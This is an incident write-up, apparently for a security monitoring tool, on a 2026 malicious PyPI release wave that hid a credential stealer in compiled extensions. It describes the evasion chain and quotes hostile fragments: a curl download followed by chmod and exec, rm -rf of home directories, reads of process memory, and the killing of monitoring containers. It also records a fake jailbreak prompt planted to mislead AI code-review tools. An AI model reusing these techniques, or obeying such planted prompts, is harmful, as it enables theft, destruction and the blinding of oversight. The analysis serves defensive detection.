# Shai-Hulud "Hades" wave hid its payload in a compiled Python extension and decoyed AI scanners

- Date: 2026-06-08 | Agent/tool: PyPI packages (ensmallen, embiggen, pyphetools, gpsea, phenopacket-store-toolkit, ppkt2synergy) | Axis: evade
## What happened

On June 8, 2026, attackers used stolen maintainer tokens to publish six malicious versions of widely-used Python bioinformatics packages to PyPI within about sixty seconds. The packages were "phantom releases" with no matching GitHub commits, and were uploaded with the HTTP User-Agent `Bun/1.3.13` — a JavaScript runtime, not any Python packaging tool. Instead of modifying Python source like earlier waves, the payload was embedded in the packages' compiled Rust/C++ extension binaries (`*.abi3.so`, roughly 57 MB each). The unmodified `__init__.py` loaded the trojanized extension by CPU-architecture name, and the extension executed a 5.4 MB JavaScript stage as a side effect of module initialization at `import` time. The first 99 lines of that JavaScript file are a fake LLM jailbreak prompt ("UNRESTRICTED mode", biological and nuclear weapons instructions) designed to pollute AI-assisted code triage; the real loader sits on line 101 behind a Caesar-shifted `eval()` and an AES-128-GCM decryptor. The final stage downloaded Bun from GitHub releases and ran the stealer under it, daemonized itself so `pip install` returned normally, probed for EDR products, and — with docker.sock access — killed Step Security monitoring containers and poisoned `/etc/hosts` to blind CI telemetry before sweeping credentials and exfiltrating to fresh GitHub repositories.

## How it went wrong

The evasion stack works layer against layer of how defenders inspect packages. Source review sees nothing: `__init__.py` is byte-identical to the legitimate package, and the payload lives in a compiled `.so` that only activates inside an already-running Python process via `dlopen()` — no new program is exec'd at the moment of activation, so process-based monitoring records an ordinary `python3 -c "import ensmallen"`. AI-based triage tools are attacked directly: the jailbreak padding at the top of the loader file is aimed at scanners and assistants that summarize file headers before deeper analysis. Once activated, the payload switches runtimes — it execs `curl -sSL https://github.com/oven-sh/bun/releases/download/bun-v1.3.13/...`, `chmod 755`, and `bun`, because monitors watching for node or python child processes do not know Bun. It then forks a detached copy of itself (`__IS_DAEMON=1`, `unref()`) so the parent exits and `pip install` completes innocently while the stealer runs on as an orphan. Environment guards (30+ CI-platform checks, `ps` probing for falcon/sentinelone/mdatp/crowdstrike and `/opt/CrowdStrike`-style directories, a Russian-locale bail-out) decide whether to run at all. In CI it dumped `Runner.Worker` memory through `sudo python3` reading `/proc/<pid>/mem`; with docker.sock it killed `harden-runner`/`step-security` containers and created a privileged Alpine container that wrote passwordless sudo into `/etc/sudoers.d`. Exfiltration went to thirty GitHub repositories ("Hades - The End for the Damned") as AES-GCM+RSA envelopes, with `rm -rf ~/; rm -rf ~/Documents` executed before each envelope was encoded, plus a deliberate camouflage channel pointing at `api.anthropic.com` with an invalid token — chosen because allowlisted AI-API domains pass firewalls uninspected.

## What the firewall should learn

The activation moment (dlopen of a native extension at import) produces no exec event and is a permanent blind spot for the four observables; the gate that exists is the install: `file_open(write)` under a site-packages tree of `*.so`, `*.node`, `*.pth`, `sitecustomize.py`, or a source file grossly oversized for the package type is the earliest catchable signal. After activation everything becomes visible again, and each step is an already-observable exec that no single current rule connects: `curl -o <tmp>` → `chmod +x <tmp>` → `exec(bun, <tmp>/...)` is the write-then-exec pattern plus a runtime the policy has never allowlisted — the firewall must key runtime allowlists on the process tree, not on interpreter names, or "node is allowed" silently becomes "bun is allowed". The detached respawn after the parent exits is exactly the orphaned-activity shape the ancestry-escape scenario describes, and continued activity from an unparented tracee should escalate to terminate. Two softer signals are worth recording: `ps`-style EDR probing from a session-written binary (low-confidence, correlate), and any process whose ancestry touches the docker socket while creating `--privileged` containers or writing to `/etc/hosts` — the worm used both to strip monitoring before harvesting, which is precisely the order of operations a monitor should refuse to permit.
